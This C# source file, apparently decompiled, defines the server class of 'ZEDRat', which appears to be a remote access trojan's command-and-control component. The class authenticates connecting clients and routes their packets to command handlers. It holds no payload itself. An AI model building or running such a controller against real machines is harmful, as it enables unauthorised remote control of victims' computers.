using System;
using System.Linq;
using ZEDRatApp.ZEDRAT.Commands;
using ZEDRatApp.ZEDRAT.NetSerializer;
using ZEDRatApp.ZEDRAT.Packets;
using ZEDRatApp.ZEDRAT.Packets.ClientPackets;
using ZEDRatApp.ZEDRAT.Packets.ServerPackets;

namespace ZEDRatApp.ZEDRAT.Networking
{
	public class ZEDRatServer : Server
	{
		public delegate void ClientConnectedEventHandler(Client client);

		public delegate void ClientDisconnectedEventHandler(Client client);

		public Client[] ConnectedClients => base.Clients.Where((Client c) => c?.Authenticated ?? false).ToArray();

		public event ClientConnectedEventHandler ClientConnected;

		public event ClientDisconnectedEventHandler ClientDisconnected;

		private void OnClientConnected(Client client)
		{
			if (!base.ProcessingDisconnect && base.Listening)
			{
				this.ClientConnected?.Invoke(client);
			}
		}

		private void OnClientDisconnected(Client client)
		{
			if (!base.ProcessingDisconnect && base.Listening)
			{
				this.ClientDisconnected?.Invoke(client);
			}
		}

		public ZEDRatServer()
		{
			base.Serializer = new Serializer(PacketRegistery.GetPacketTypes());
			base.ClientState += new ClientStateEventHandler(OnClientState);
			base.ClientRead += new ClientReadEventHandler(OnClientRead);
		}

		private void OnClientState(Server server, Client client, bool connected)
		{
			if (connected)
			{
				new GetAuthentication().Execute(client);
			}
			else if (client.Authenticated)
			{
				this.OnClientDisconnected(client);
			}
		}

		private void OnClientRead(Server server, Client client, IPacket packet)
		{
			Type type = packet.GetType();
			if (!client.Authenticated)
			{
				if (type == typeof(GetAuthenticationResponse))
				{
					client.Authenticated = true;
					new SetAuthenticationSuccess().Execute(client);
					CommandHandler.HandleGetAuthenticationResponse(client, (GetAuthenticationResponse)packet);
					this.OnClientConnected(client);
				}
				else
				{
					client.Disconnect();
				}
			}
			else
			{
				PacketHandler.HandlePacket(client, packet);
			}
		}
	}
}
